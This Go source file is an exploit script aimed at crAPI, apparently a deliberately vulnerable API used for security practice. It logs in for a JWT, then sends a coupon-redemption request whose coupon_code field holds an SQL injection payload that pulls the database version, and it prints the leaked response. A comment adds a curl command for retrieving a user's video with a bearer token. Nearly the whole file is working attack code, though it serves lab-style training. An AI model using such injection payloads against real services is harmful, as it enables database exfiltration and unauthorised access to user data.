package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"

	configurator "github.com/tomek-skrond/crapiconfigurator"
)

func main() {
	pwd, _ := os.Getwd()
	config, err := configurator.GetConfig(pwd + "/config.json")
	if err != nil {
		log.Fatalln(err)
	}
	// to check video after you can use also:
	// curl -X GET -H "Authorization: Bearer $valid_token" http://crapi.bobaklabs.com:8888/identity/api/v2/user/videos/$videoId > file.out
	// get jwt token
	token := configurator.GetJWTToken(config.LoginURL, config.Email, config.Password)
	if token == "" {
		log.Fatalln("token empty")
	}

	fmt.Println("Database leaks through SQL Injection vulnerability!")
	SQLInjection(config.TargetURL, token)

}

func SQLInjection(tageturl, token string) {
	client := configurator.CustomHttpClient()

	payload := map[string]interface{}{
		"coupon_code": "0'; select version() --+",
		"amount":      75,
	}

	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		log.Fatalln(err)
	}

	req, err := http.NewRequest("POST", tageturl, bytes.NewBuffer(jsonPayload))
	if err != nil {
		log.Fatalln(err)
	}
	req.Header.Set("Content-Type", "application/json")

	req = configurator.ConfigureRequest(req, token)

	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}

	respBody, err := configurator.ReadBody(resp)
	if err != nil {
		log.Fatalln(err)
	}

	fmt.Println(string(respBody))

}
